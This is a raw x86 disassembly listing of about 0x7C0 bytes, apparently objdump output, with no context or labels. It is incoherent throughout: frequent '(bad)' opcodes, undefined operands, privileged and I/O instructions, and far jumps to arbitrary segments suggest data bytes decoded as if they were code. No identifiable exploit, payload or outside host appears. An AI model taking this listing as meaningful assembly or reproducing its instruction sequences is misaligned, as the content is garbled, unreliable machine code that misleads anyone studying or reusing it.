  425d23:	(bad)  
  425d24:	stos   BYTE PTR es:[edi],al
  425d25:	pop    edx
  425d26:	ret    
  425d27:	loope  0x425cfc
  425d29:	xchg   edx,eax
  425d2a:	pop    edx
  425d2b:	mov    ds:0x5fc6a6a3,eax
  425d30:	leave  
  425d31:	add    bh,BYTE PTR [ebp-0x3f]
  425d34:	rcl    DWORD PTR [ebx],cl
  425d36:	jl     0x425d62
  425d38:	adc    ecx,DWORD PTR [edx]
  425d3a:	jmp    0x425d4e
  425d3c:	xlat   BYTE PTR ds:[ebx]
  425d3d:	outs   dx,BYTE PTR ds:[esi]
  425d3e:	mov    cl,0x69
  425d40:	and    al,0x2c
  425d42:	scas   eax,DWORD PTR es:[edi]
  425d43:	pop    ss
  425d44:	into   
  425d45:	inc    edx
  425d46:	xchg   esi,eax
  425d47:	pop    ds
  425d48:	sbb    al,0x59
  425d4a:	test   BYTE PTR [edx-0x1a],ch
  425d4d:	dec    edx
  425d4e:	xchg   DWORD PTR [esi+0x35],ebp
  425d51:	mov    esi,0xae7948fd
  425d56:	ret    
  425d57:	popf   
  425d58:	scas   eax,DWORD PTR es:[edi]
  425d59:	test   eax,0x23627e08
  425d5e:	inc    edx
  425d5f:	sti    
  425d60:	xchg   bh,al
  425d62:	push   esi
  425d63:	and    BYTE PTR [edx*1+0x4de928da],dh
  425d6a:	push   ds
  425d6b:	aas    
  425d6c:	fst    DWORD PTR [ebx+0x7de4cedd]
  425d72:	retf   0x6a5c
  425d75:	xchg   esi,eax
  425d76:	push   0xc5847d4f
  425d7b:	adc    BYTE PTR [eax],cl
  425d7d:	loop   0x425ddf
  425d7f:	or     al,0xd1
  425d81:	sahf   
  425d82:	push   es
  425d83:	lods   eax,DWORD PTR ds:[esi]
  425d84:	xchg   ebx,eax
  425d85:	mov    ah,BYTE PTR [eax]
  425d87:	ficom  DWORD PTR [edx+0xe060e6e]
  425d8d:	ss (bad) 
  425d8f:	ins    BYTE PTR es:[edi],dx
  425d90:	mov    ah,0xed
  425d92:	outs   dx,BYTE PTR ds:[esi]
  425d93:	neg    DWORD PTR [ebx+0x7291334d]
  425d99:	fild   DWORD PTR [ebp+eax*2+0x619bba27]
  425da0:	pop    esp
  425da1:	idiv   DWORD PTR [edi+ebp*1]
  425da4:	jg     0x425db9
  425da6:	sahf   
  425da7:	xor    al,0xb5
  425da9:	pop    ebx
  425daa:	js     0x425d48
  425dac:	jge    0x425d96
  425dae:	jmp    0xbe06:0x465b71aa
  425db5:	aad    0x6b
  425db7:	test   eax,0x1556282b
  425dbc:	mov    WORD PTR [edx+0x13aee0c8],cs
  425dc2:	xor    ch,BYTE PTR [ebx-0x4c8c3005]
  425dc8:	clc    
  425dc9:	call   0xf5cb:0x509a7a28
  425dd0:	int    0xa4
  425dd2:	and    DWORD PTR [edi+0x73d224e3],ebp
  425dd8:	sub    al,0x95
  425dda:	and    DWORD PTR [esi+eax*4],edx
  425ddd:	aad    0x7
  425ddf:	or     esi,esp
  425de1:	ror    BYTE PTR [ebp+0x371fd19],cl
  425de7:	cld    
  425de8:	and    DWORD PTR [ebx],edx
  425dea:	jmp    0xc1af:0xe5dca9d9
  425df1:	push   edx
  425df2:	daa    
  425df3:	(bad)  
  425df4:	push   esp
  425df5:	in     al,0xff
  425df7:	xor    al,0x73
  425df9:	mov    edx,0xb3e706ce
  425dfe:	mov    ds:0xed9a564d,al
  425e03:	sub    eax,0x5d4b9dc5
  425e08:	shl    DWORD PTR [ebx+0x62],0xf3
  425e0c:	mov    ecx,DWORD PTR [edi+eiz*2-0x74]
  425e10:	fstp   QWORD PTR [esi+0x7d]
  425e13:	mov    gs,WORD PTR [ebx-0x24]
  425e16:	(bad)  
  425e18:	sub    edx,DWORD PTR [edi]
  425e1a:	jnp    0x425dd1
  425e1c:	sbb    BYTE PTR [ecx+eax*8],dh
  425e1f:	lahf   
  425e20:	push   eax
  425e21:	cmc    
  425e22:	mov    ecx,DWORD PTR [esi+0x2294805f]
  425e28:	and    eax,DWORD PTR [esi-0x45589301]
  425e2e:	fsubr  DWORD PTR [edi+0x21]
  425e31:	push   ebp
  425e32:	aaa    
  425e33:	pop    ebp
  425e34:	enter  0xf0a8,0x2a
  425e38:	adc    dl,BYTE PTR [esp+eiz*8]
  425e3b:	mov    BYTE PTR [edx-0x43a04077],bl
  425e41:	inc    edx
  425e42:	out    dx,eax
  425e43:	out    dx,eax
  425e44:	add    eax,0xc77826
  425e49:	add    BYTE PTR [edx+0x44],al
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0xb2
  425e57:	inc    esi
  425e58:	xor    edx,DWORD PTR [ebx+0x36]
  425e5b:	in     al,dx
  425e5c:	add    DWORD PTR [eax],eax
  425e5e:	xchg   BYTE PTR [esi],al
  425e60:	add    BYTE PTR [eax],al
  425e62:	add    esp,DWORD PTR [ebx+ebp*1]
  425e65:	ja     0x425ecb
  425e67:	dec    esp
  425e68:	loope  0x425df7
  425e6a:	jns    0x425dfc
  425e6c:	inc    edi
  425e6d:	push   ebx
  425e6e:	aad    0xed
  425e70:	(bad)  
  425e71:	in     eax,dx
  425e72:	push   ds
  425e73:	adc    al,0xb4
  425e75:	fisttp QWORD PTR [esi-0x46]
  425e78:	jecxz  0x425e6f
  425e7a:	push   cs
  425e7b:	add    esi,DWORD PTR [edi]
  425e7d:	popf   
  425e7e:	cs inc esi
  425e80:	pop    edi
  425e81:	mov    ds:0xe7fd64fb,eax
  425e86:	pushf  
  425e87:	pop    ebp
  425e88:	push   ebp
  425e89:	xchg   ebp,eax
  425e8a:	les    esp,FWORD PTR [edi-0x55]
  425e8d:	and    si,bx
  425e90:	mov    esp,edx
  425e92:	sub    al,0xa9
  425e94:	bound  edi,QWORD PTR [edi]
  425e96:	cmp    eax,0xdb11913e
  425e9b:	xchg   BYTE PTR [edx],dh
  425e9d:	jnp    0x425ec7
  425e9f:	retfw  
  425ea1:	pop    ecx
  425ea2:	ds xchg esi,eax
  425ea4:	ss cli 
  425ea6:	xchg   esi,eax
  425ea7:	mov    esp,0xb165526f
  425eac:	les    edx,FWORD PTR [edx]
  425eae:	retf   0xdaf4
  425eb1:	loopne 0x425ec9
  425eb3:	push   cs
  425eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eb5:	and    eax,edi
  425eb7:	xchg   ecx,eax
  425eb8:	mov    ah,0xd7
  425eba:	cmp    eax,0x8312d8c8
  425ebf:	inc    edi
  425ec0:	mov    edx,0x7955f4bd
  425ec5:	cmp    BYTE PTR [ebx],ah
  425ec7:	clc    
  425ec8:	push   ecx
  425ec9:	dec    ebx
  425eca:	add    al,0x3c
  425ecc:	mov    edx,0x8c0e904e
  425ed1:	xchg   esp,eax
  425ed2:	dec    ebp
  425ed3:	adc    eax,0x9eac46d3
  425ed8:	push   ss
  425ed9:	shr    DWORD PTR [esi],cl
  425edb:	sbb    esi,eax
  425edd:	mov    dl,0xd7
  425edf:	scas   al,BYTE PTR es:[edi]
  425ee0:	aaa    
  425ee1:	mov    ds:0x5e0aa6ea,eax
  425ee6:	jmp    0xbef0:0x6012c192
  425eed:	fstp   QWORD PTR [esi+0x6b]
  425ef0:	fist   WORD PTR [ebx+ebp*1-0x1f]
  425ef4:	mov    dl,0x1c
  425ef6:	loopne 0x425ea5
  425ef8:	sub    al,0x62
  425efa:	repnz cdq 
  425efc:	push   ds
  425efd:	cmp    eax,0x91330297
  425f02:	fcmovnb st,st(3)
  425f04:	lahf   
  425f05:	loopne 0x425f68
  425f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f08:	mov    ds:0xe5d41d6a,eax
  425f0d:	out    0x68,eax
  425f0f:	(bad)
  425f13:	fcompp 
  425f15:	mov    dh,0x2e
  425f17:	push   ds
  425f18:	xchg   BYTE PTR [edx+0x7ee331b4],dh
  425f1e:	leave  
  425f1f:	mov    ds:0xac7e8f38,al
  425f24:	rcr    DWORD PTR [edx+0x19],cl
  425f27:	xchg   esi,eax
  425f28:	int    0xed
  425f2a:	cmp    bl,BYTE PTR fs:[eax-0x5]
  425f2e:	jmp    0x425f31
  425f30:	test   DWORD PTR [ebx+0x1c],0xba245e52
  425f37:	lds    esi,FWORD PTR [ebx+0x11]
  425f3a:	mov    esp,0x60a51035
  425f3f:	ret    0xc3b7
  425f42:	(bad)  
  425f43:	(bad)  
  425f44:	mov    edx,0xb4f438d6
  425f49:	cmp    eax,0x6ca46476
  425f4e:	pop    ebp
  425f4f:	mov    bh,BYTE PTR [esi+0x54]
  425f52:	pop    ecx
  425f53:	das    
  425f54:	ror    BYTE PTR [ecx+0x30],1
  425f57:	pop    ss
  425f58:	push   edi
  425f59:	sub    al,0xa7
  425f5b:	bound  ebx,QWORD PTR [eax+ebp*1-0x1b6337cc]
  425f62:	mov    al,ds:0x9b289ad1
  425f67:	mov    dl,0xdd
  425f69:	bound  ebp,QWORD PTR [ecx]
  425f6b:	mov    al,ds:0x29a5b6e0
  425f70:	in     eax,0xc8
  425f72:	dec    eax
  425f73:	loope  0x425f65
  425f75:	(bad)  
  425f76:	lahf   
  425f77:	or     DWORD PTR [eax],0xc351da47
  425f7d:	jnp    0x425f1e
  425f7f:	push   0x9a57d347
  425f84:	in     al,0xa9
  425f86:	pushf  
  425f87:	mov    esi,0xeb797690
  425f8c:	pop    ss
  425f8d:	daa    
  425f8e:	les    edi,FWORD PTR [esi-0x56]
  425f91:	jmp    DWORD PTR [esi-0x76084099]
  425f97:	sub    eax,0x4b8c6c79
  425f9c:	sub    esi,ebx
  425f9e:	mov    eax,0xf9a3582b
  425fa3:	outs   dx,DWORD PTR ds:[esi]
  425fa4:	imul   edx,DWORD PTR [esi],0x720e0bc1
  425faa:	push   ebp
  425fab:	add    ch,dh
  425fad:	aas    
  425fae:	jg     0x425fef
  425fb0:	lods   al,BYTE PTR ds:[esi]
  425fb1:	jmp    0x425f41
  425fb3:	inc    edi
  425fb4:	test   DWORD PTR [ebx],esi
  425fb6:	inc    ebp
  425fb7:	push   ecx
  425fb8:	repz retf 0xc050
  425fbc:	mov    dl,0x3f
  425fbe:	xor    al,0xf3
  425fc0:	sbb    ecx,DWORD PTR [eax-0x58]
  425fc3:	sbb    DWORD PTR [eax+0x3a8402b5],edx
  425fc9:	ja     0x425f7c
  425fcb:	mov    ebx,0x904ea6b2
  425fd0:	xchg   edx,eax
  425fd1:	addr16 (bad) 
  425fd3:	xchg   ecx,eax
  425fd4:	das    
  425fd5:	or     eax,0x3ceee32c
  425fda:	adc    al,0xb8
  425fdc:	push   edx
  425fdd:	in     eax,0xd
  425fdf:	pop    es
  425fe0:	mov    dh,0x35
  425fe2:	mov    ecx,0x479012f5
  425fe7:	or     cl,BYTE PTR [eax+0x6a983493]
  425fed:	mov    dh,0x7e
  425fef:	sbb    ebx,edi
  425ff1:	pop    ebp
  425ff2:	shl    esp,cl
  425ff4:	cmp    al,0x32
  425ff6:	daa    
  425ff7:	xchg   edi,eax
  425ff8:	pop    edi
  425ff9:	aaa    
  425ffa:	xlat   BYTE PTR ds:[ebx]
  425ffb:	call   0xe1b1:0x49def797
  426002:	popf   
  426003:	not    DWORD PTR [eax+0x14407032]
  426009:	adc    al,BYTE PTR [edx+0x5654f96b]
  42600f:	into   
  426010:	hlt    
  426011:	xlat   BYTE PTR ds:[ebx]
  426012:	inc    esi
  426013:	icebp  
  426014:	pop    ebx
  426015:	fwait
  426016:	push   ss
  426017:	imul   ebx,DWORD PTR [edi+0x7d],0x457ca17f
  42601e:	rcl    BYTE PTR es:[eax+0x2e57b6ac],cl
  426025:	jmp    0xec47:0x5cbaa240
  42602c:	cmp    BYTE PTR [ebp-0x35],bl
  42602f:	mov    dh,BYTE PTR [eax*8+0x4d7e80e6]
  426036:	jmp    0x7094a4ca
  42603b:	iret   
  42603c:	test   DWORD PTR [eax+ebp*8-0x2b6db2c5],0x846f949
  426047:	sub    DWORD PTR [edi-0x5694f220],edi
  42604d:	sti    
  42604e:	enter  0x32f8,0x8c
  426052:	adc    ebp,ecx
  426054:	(bad)  
  426055:	sub    esp,DWORD PTR [ebx]
  426057:	in     eax,0x9c
  426059:	popa   
  42605a:	pop    eax
  42605b:	cmp    BYTE PTR [eax+0x442be44e],cl
  426061:	or     BYTE PTR [ecx],bh
  426063:	mov    WORD PTR [edi],?
  426065:	xchg   ecx,eax
  426066:	xor    BYTE PTR [esi+0x786ed8d8],bl
  42606c:	hlt    
  42606d:	fnstenv [ebx+eax*8+0x56f6f2f7]
  426074:	push   edi
  426075:	in     al,0x27
  426077:	lods   al,BYTE PTR ds:[esi]
  426078:	inc    esp
  426079:	xor    ebp,DWORD PTR [ebx]
  42607b:	sub    BYTE PTR [eax],ah
  42607d:	push   es
  42607e:	int3   
  42607f:	sti    
  426080:	enter  0xc5a3,0x77
  426084:	int3   
  426085:	and    al,0x7c
  426087:	enter  0xea9d,0x60
  42608b:	mov    bl,BYTE PTR [edx+0x39]
  42608e:	jg     0x4260f8
  426090:	jle    0x42604f
  426092:	ja     0x42606a
  426094:	into   
  426095:	aaa    
  426096:	xchg   esp,eax
  426097:	mov    cs:0x62a2a5a5,eax
  42609d:	push   ebx
  42609e:	cli    
  42609f:	mov    bl,0xa9
  4260a1:	adc    DWORD PTR [esp+eax*4],edi
  4260a4:	xor    esp,DWORD PTR [esi-0xd076869]
  4260aa:	(bad)  
  4260ab:	cwde   
  4260ac:	ret    0x6a50
  4260af:	or     ecx,edi
  4260b1:	mov    eax,ds:0xb218e1e9
  4260b6:	sub    BYTE PTR [eax],0x48
  4260b9:	orps   xmm7,XMMWORD PTR [edi]
  4260bc:	pop    ss
  4260bd:	xchg   edx,eax
  4260be:	add    edx,DWORD PTR [eax+0x6a8d06e0]
  4260c4:	cmp    eax,0xb86182ef
  4260c9:	xor    dl,dl
  4260cb:	mov    bh,0xff
  4260cd:	(bad)
  4260d0:	fwait
  4260d1:	inc    ebx
  4260d2:	test   al,0x8a
  4260d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260d5:	pushf  
  4260d6:	add    BYTE PTR [ecx-0x1e],ch
  4260d9:	mov    edi,0x9679823e
  4260de:	in     al,dx
  4260df:	scas   al,BYTE PTR es:[edi]
  4260e0:	int    0xea
  4260e2:	repz push ecx
  4260e4:	call   FWORD PTR [ecx+edx*8+0x7e14cf15]
  4260eb:	dec    edi
  4260ec:	sub    DWORD PTR [esi],esp
  4260ee:	pop    eax
  4260ef:	fsub   st,st(3)
  4260f1:	(bad)  
  4260f2:	loope  0x426129
  4260f4:	rcl    DWORD PTR [ebx+0x6d],0xcf
  4260f8:	mov    cl,0x3d
  4260fa:	sbb    BYTE PTR [ebx+0x7260435c],dl
  426100:	sub    BYTE PTR [esi+0x5f],dl
  426103:	outs   dx,DWORD PTR ds:[esi]
  426104:	dec    ebp
  426105:	lds    edx,FWORD PTR [esi]
  426107:	shl    BYTE PTR [edi-0x4f85dc90],0xa9
  42610e:	sbb    ebx,edi
  426110:	ret    0x88a6
  426113:	aas    
  426114:	mov    cl,0x81
  426116:	rcr    dh,0xc
  426119:	pop    ss
  42611a:	sbb    eax,0x21f1f68
  42611f:	ffreep st(6)
  426121:	jmp    0xccfc2566
  426126:	pop    edx
  426127:	fsubp  st(4),st
  426129:	dec    esi
  42612a:	mov    ds:0xcfb30bde,al
  42612f:	(bad)  
  426130:	push   eax
  426131:	cmp    DWORD PTR [ecx],eax
  426133:	ss pop esp
  426135:	cli    
  426136:	lods   eax,DWORD PTR ds:[esi]
  426137:	popf   
  426138:	inc    eax
  426139:	mov    fs,WORD PTR [edx-0x3d]
  42613c:	add    eax,0x81fed1eb
  426141:	xlat   BYTE PTR ds:[ebx]
  426142:	ret    
  426143:	push   ecx
  426144:	sub    al,0xda
  426146:	dec    ecx
  426147:	dec    ebx
  426148:	mov    ecx,0xb75aa302
  42614d:	pop    esi
  42614e:	add    DWORD PTR [eax-0x42],ecx
  426151:	(bad)  
  426152:	push   ss
  426153:	fist   DWORD PTR [ebp+ebx*8-0x7c]
  426157:	mov    esp,0x124b000c
  42615c:	push   ebx
  42615d:	xor    BYTE PTR [eax],bh
  42615f:	adc    BYTE PTR [esi],0x30
  426162:	xor    DWORD PTR [eax-0x4],ebp
  426165:	or     eax,0x73128581
  42616a:	adc    BYTE PTR [ebx+0x46],0x9a
  42616e:	sbb    eax,0xd79dd4c3
  426173:	aaa    
  426174:	(bad)  
  426175:	pop    esp
  426176:	pushf  
  426177:	out    dx,eax
  426178:	cmp    bh,0xb6
  42617b:	push   0xdeb6daa9
  426180:	pusha  
  426181:	mov    ds,esi
  426183:	or     eax,DWORD PTR [ebx-0x781e0eac]
  426189:	sbb    eax,0x5ece579f
  42618e:	jecxz  0x426115
  426190:	sti    
  426191:	popa   
  426192:	test   al,0x60
  426194:	and    ah,BYTE PTR [edx-0x146ecd5]
  42619a:	fist   WORD PTR [edx-0x3b]
  42619d:	mov    ch,0x78
  42619f:	mov    fs,WORD PTR [edi+0x3f]
  4261a2:	outs   dx,DWORD PTR ds:[esi]
  4261a3:	add    BYTE PTR [edx-0x3dbe1d6c],dl
  4261a9:	xor    al,0xd6
  4261ab:	call   0x2e18:0x54278e3b
  4261b2:	aaa    
  4261b3:	fnstsw WORD PTR fs:[eax+0x27395b89]
  4261ba:	sbb    DWORD PTR [ecx-0x65],ecx
  4261bd:	mov    ch,0x67
  4261bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261c0:	sbb    al,0x3f
  4261c2:	mov    ebp,0x625017b0
  4261c7:	push   edi
  4261c8:	fstp   TBYTE PTR [eax+0x4d]
  4261cb:	cdq    
  4261cc:	sbb    eax,0x953c5a00
  4261d1:	dec    ebx
  4261d2:	nop
  4261d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261d4:	cmc    
  4261d5:	std    
  4261d6:	aaa    
  4261d7:	les    ebx,FWORD PTR [ecx-0x1e8eb901]
  4261dd:	popa   
  4261de:	stos   DWORD PTR es:[edi],eax
  4261df:	pop    ss
  4261e0:	mov    eax,0x274978b0
  4261e5:	cli    
  4261e6:	loopne 0x426178
  4261e8:	or     eax,0x6bd06f7b
  4261ed:	add    DWORD PTR [ebx+0x41],ebx
  4261f0:	mov    bh,0x79
  4261f2:	out    dx,al
  4261f3:	or     DWORD PTR [esi-0x6cf67bd3],ecx
  4261f9:	mov    bl,0xb1
  4261fb:	mov    BYTE PTR ds:0x541d9cd3,bl
  426201:	faddp  st(6),st
  426203:	sti    
  426204:	or     al,0x2b
  426206:	and    esi,ecx
  426208:	add    BYTE PTR [edx+0x54],0x28
  42620c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42620d:	loope  0x42622b
  42620f:	aad    0xca
  426211:	mov    dl,0xed
  426213:	xchg   edi,eax
  426214:	sbb    eax,0x7781eaa1
  426219:	jns    0x4261b6
  42621b:	iret   
  42621c:	push   ss
  42621d:	rol    BYTE PTR [esi+edx*1+0x7d],0xd2
  426222:	cmc    
  426223:	inc    ecx
  426224:	stc    
  426225:	call   0xe50cd06
  42622a:	arpl   bp,dx
  42622c:	imul   esi,DWORD PTR [ebx+0x15],0x3df65b96
  426233:	dec    ecx
  426234:	enter  0xb6e3,0x54
  426238:	add    BYTE PTR ss:[ebx],ch
  42623b:	jle    0x4262bc
  42623d:	jg     0x42622a
  42623f:	enter  0xa644,0xef
  426243:	push   ss
  426244:	add    eax,0xe185b4ce
  426249:	out    0xf1,eax
  42624b:	cmc    
  42624c:	mov    al,ds:0xff1be760
  426251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426253:	adc    eax,0xa4862646
  426258:	or     BYTE PTR [edx+eiz*4],al
  42625b:	xchg   edi,eax
  42625c:	pop    edx
  42625d:	jbe    0x426205
  42625f:	data16 jbe 0x426242
  426262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426263:	jmp    0x3c65:0xa9310345
  42626a:	popf   
  42626b:	or     ebp,ecx
  42626d:	lahf   
  42626e:	mov    edi,0x9f83bd36
  426273:	pop    edi
  426274:	push   ebp
  426275:	cmp    ch,ah
  426277:	xchg   DWORD PTR [edx-0x4a],ecx
  42627a:	inc    eax
  42627b:	xor    al,0x43
  42627d:	xlat   BYTE PTR ds:[ebx]
  42627e:	jecxz  0x426227
  426280:	leave  
  426281:	mov    ?,WORD PTR [ebx+eax*4-0x1991290e]
  426288:	stos   BYTE PTR es:[edi],al
  426289:	loope  0x426282
  42628b:	cmp    al,0xe1
  42628d:	push   esp
  42628e:	cmp    esi,eax
  426290:	add    BYTE PTR [ebx+0x7e0a4b2e],dl
  426296:	scas   al,BYTE PTR es:[edi]
  426297:	dec    edx
  426298:	dec    edi
  426299:	add    ch,ah
  42629b:	mov    esi,DWORD PTR [ecx+edi*4-0x14d04168]
  4262a2:	lds    edx,FWORD PTR [eax+0x50]
  4262a5:	add    dl,0xb3
  4262a8:	mov    ds:0xb81a1ee1,al
  4262ad:	das    
  4262ae:	bnd jno 0x42623e
  4262b1:	dec    edi
  4262b2:	jl     0x42630c
  4262b4:	stos   BYTE PTR es:[edi],al
  4262b5:	jle    0x426276
  4262b7:	add    al,0xb6
  4262b9:	or     dl,BYTE PTR [esi]
  4262bb:	mov    al,BYTE PTR [ebx+esi*4+0x55]
  4262bf:	leave  
  4262c0:	adc    DWORD PTR [ebx],ebp
  4262c2:	fisttp WORD PTR [ecx+0x7bbcdf6d]
  4262c8:	xchg   edx,eax
  4262c9:	outs   dx,DWORD PTR ds:[esi]
  4262ca:	xchg   esi,eax
  4262cb:	ds ins BYTE PTR es:[edi],dx
  4262cd:	jns    0x426311
  4262cf:	fld    QWORD PTR [edx+0x578cf0db]
  4262d5:	dec    edx
  4262d6:	pop    ecx
  4262d7:	ror    DWORD PTR [ebp-0x6],0x33
  4262db:	adc    al,0xfa
  4262dd:	mov    al,ds:0xb48e6e51
  4262e2:	mov    ebx,0xc8ceb8d9
  4262e7:	sbb    esi,edx
  4262e9:	call   0xf387:0x1bd68c9d
  4262f0:	pop    edx
  4262f1:	in     al,0x52
  4262f3:	outs   dx,BYTE PTR ds:[esi]
  4262f4:	mov    bl,BYTE PTR [ebx+eax*8]
  4262f7:	lea    eax,[edi]
  4262f9:	test   eax,0xa88bf7ca
  4262fe:	push   ebp
  4262ff:	adc    dl,BYTE PTR [ecx]
  426301:	je     0x4262f4
  426303:	mov    eax,0xe469eca5
  426308:	inc    edi
  426309:	bound  ecx,QWORD PTR [ebx]
  42630b:	sub    ch,BYTE PTR [eax-0x5df5b914]
  426311:	mov    WORD PTR [edi-0x5546a42d],ds
  426317:	mov    eax,0xc710b2d
  42631c:	sub    BYTE PTR [eax-0x1d7cc2d7],cl
  426322:	jno    0x42630a
  426324:	js     0x426382
  426326:	nop
  426327:	cmp    DWORD PTR [ecx+0x39],ebp
  42632a:	mov    ecx,DWORD PTR [eax-0x6c871afa]
  426330:	data16 sbb bh,0xde
  426334:	retf   0x9530
  426337:	dec    ebp
  426338:	lds    esp,FWORD PTR [eax-0x11ddc546]
  42633e:	out    dx,al
  42633f:	cli    
  426340:	xor    al,BYTE PTR [edi+0x3de86739]
  426346:	clc    
  426347:	out    0x8b,al
  426349:	jle    0x426362
  42634b:	(bad)  
  42634c:	lds    eax,FWORD PTR [eax+eiz*8-0xd]
  426350:	inc    ecx
  426351:	xchg   esp,eax
  426352:	into   
  426353:	xchg   DWORD PTR [eax-0x33a55819],esp
  426359:	stos   DWORD PTR es:[edi],eax
  42635a:	sar    DWORD PTR ds:0x9c55192b,cl
  426360:	push   es
  426361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426362:	xchg   esi,eax
  426363:	call   0xed4c:0x3107420
  42636a:	out    0x89,al
  42636c:	repnz clc 
  42636e:	aam    0x2c
  426370:	mov    al,ds:0xc5aca73a
  426375:	mov    bh,0xd6
  426377:	outs   dx,BYTE PTR ds:[esi]
  426378:	or     BYTE PTR cs:[ecx],al
  42637b:	sti    
  42637c:	out    dx,al
  42637d:	or     esi,DWORD PTR [eax]
  42637f:	sub    al,0x83
  426381:	clc    
  426382:	pop    es
  426383:	std    
  426384:	pop    esi
  426385:	mov    ch,0xb2
  426387:	int    0x1d
  426389:	stos   BYTE PTR es:[edi],al
  42638a:	pop    ebp
  42638b:	add    eax,0x3e20e7c1
  426390:	call   0x1cdc038b
  426395:	mov    ch,0x43
  426397:	mov    esp,0x74109c8b
  42639c:	call   0x4a39:0xa4a4eb4f
  4263a3:	or     al,0xdc
  4263a5:	popf   
  4263a6:	or     ebp,esp
  4263a8:	and    BYTE PTR [ebx],dh
  4263aa:	stos   BYTE PTR es:[edi],al
  4263ab:	imul   ebp,DWORD PTR [edi+0x6f],0x4b4e5f5
  4263b2:	cmp    ecx,DWORD PTR [edx+0x6b]
  4263b5:	mov    cl,0x6a
  4263b7:	sbb    al,bl
  4263b9:	inc    ebp
  4263ba:	and    edi,DWORD PTR [edx+0x77557609]
  4263c0:	xchg   BYTE PTR [edx+eiz*2],ah
  4263c3:	push   eax
  4263c4:	push   ds
  4263c5:	cwde   
  4263c6:	and    esi,DWORD PTR [eax+eiz*2-0x63]
  4263ca:	test   DWORD PTR [esi+0xa],edi
  4263cd:	adc    DWORD PTR [esi-0x1dd10be5],esi
  4263d3:	mov    bh,0x15
  4263d5:	add    eax,0xdb530c00
  4263da:	jno    0x42640d
  4263dc:	mov    ecx,cs
  4263de:	cli    
  4263df:	jae    0x426391
  4263e1:	cmp    eax,0xa7a8d31
  4263e7:	inc    ebx
  4263e8:	mov    DWORD PTR [eax+eax*4+0x5a],esi
  4263ec:	out    dx,al
  4263ed:	call   0x501e:0x881a5fb7
  4263f4:	xchg   edi,eax
  4263f5:	cli    
  4263f6:	push   0xffffff90
  4263f8:	xchg   ebx,eax
  4263f9:	fcomp  st(5)
  4263fb:	or     BYTE PTR [edi],al
  4263fd:	sub    al,0x80
  4263ff:	lods   al,BYTE PTR ds:[esi]
  426400:	scas   eax,DWORD PTR es:[edi]
  426401:	xchg   ecx,eax
  426402:	lock push ss
  426404:	nop
  426405:	sbb    al,0xe4
  426407:	mov    ds,WORD PTR [edx+0x756e95c3]
  42640d:	mov    ecx,0x9a51cef0
  426412:	xor    eax,0x952d038b
  426417:	and    dh,dl
  426419:	mov    al,ds:0x488fdfb
  42641e:	stos   DWORD PTR es:[edi],eax
  42641f:	push   ebx
  426420:	or     eax,0xb291a7ff
  426425:	xchg   ebx,eax
  426426:	fwait
  426427:	jnp    0x4263e6
  426429:	in     eax,dx
  42642a:	sub    eax,0xaf68a2b8
  42642f:	xchg   ebp,eax
  426430:	fsubr  st(7),st
  426432:	pop    eax
  426433:	cdq    
  426434:	cmp    al,0xd0
  426436:	popa   
  426437:	mov    esp,0x92936d44
  42643c:	adc    bh,bh
  42643e:	inc    edi
  42643f:	mov    ah,0xb5
  426441:	cmp    eax,0x33053210
  426446:	dec    edx
  426447:	in     al,0x94
  426449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42644a:	dec    ebx
  42644b:	xchg   edx,eax
  42644c:	mov    ds:0x9760f50e,eax
  426451:	add    DWORD PTR [ebx],ebp
  426453:	test   BYTE PTR [ebp+0x5e],0x1
  426457:	push   ecx
  426458:	sbb    ch,cl
  42645a:	adc    bh,ah
  42645c:	mov    dl,0x4
  42645e:	(bad)  
  42645f:	iret   
  426460:	jae    0x426422
  426462:	cmp    DWORD PTR [ecx-0x2f9a012b],ecx
  426468:	sbb    BYTE PTR [eax+0x18298628],al
  42646e:	les    eax,FWORD PTR [eax]
  426470:	lods   eax,DWORD PTR ds:[esi]
  426471:	push   ecx
  426472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426473:	xchg   esp,eax
  426474:	xchg   ecx,eax
  426475:	icebp  
  426476:	lahf   
  426477:	sbb    eax,0x647be710
  42647c:	mov    al,ds:0x3b1dffd
  426481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426482:	jp     0x42640a
  426484:	repnz mov dh,BYTE PTR [edi-0x6]
  426488:	inc    eax
  426489:	fsub   QWORD PTR [ebp+0x379c520f]
  42648f:	enter  0x644b,0x87
  426493:	mov    dh,0x8f
  426495:	test   al,0x31
  426497:	or     bl,BYTE PTR [ebx]
  426499:	sar    bh,cl
  42649b:	lea    eax,[esi]
  42649d:	push   ebp
  42649e:	push   ss
  42649f:	jp     0x4264f5
  4264a1:	je     0x426484
  4264a3:	push   ss
  4264a4:	je     0x426514
  4264a6:	adc    eax,0x259aad3b
  4264ab:	pop    ds
  4264ac:	adc    al,0xe6
  4264ae:	jmp    0x426501
  4264b0:	jmp    DWORD PTR [esi]
  4264b2:	sahf   
  4264b3:	sbb    eax,0x8831e57f
  4264b8:	and    al,0x91
  4264ba:	lods   al,BYTE PTR ds:[esi]
  4264bb:	cmp    al,0x7f
  4264bd:	mov    dl,0x99
  4264bf:	pop    eax
  4264c0:	and    ebp,DWORD PTR ss:[edx-0x28]
  4264c4:	xor    ecx,esi
  4264c6:	pop    edi
  4264c7:	and    eax,0xb76dac7d
  4264cc:	jl     0x426517
  4264ce:	(bad)  
  4264cf:	mov    ds:0xe4fbb7c1,al
  4264d4:	dec    ebp
  4264d5:	push   0x5e
  4264d7:	xor    al,0x81
  4264d9:	jg     0x426529
  4264db:	inc    esi
  4264dc:	jl     0x42653e
  4264de:	je     0x4264e0
  4264e0:	jg     0x4264bd
  4264e2:	aaa    
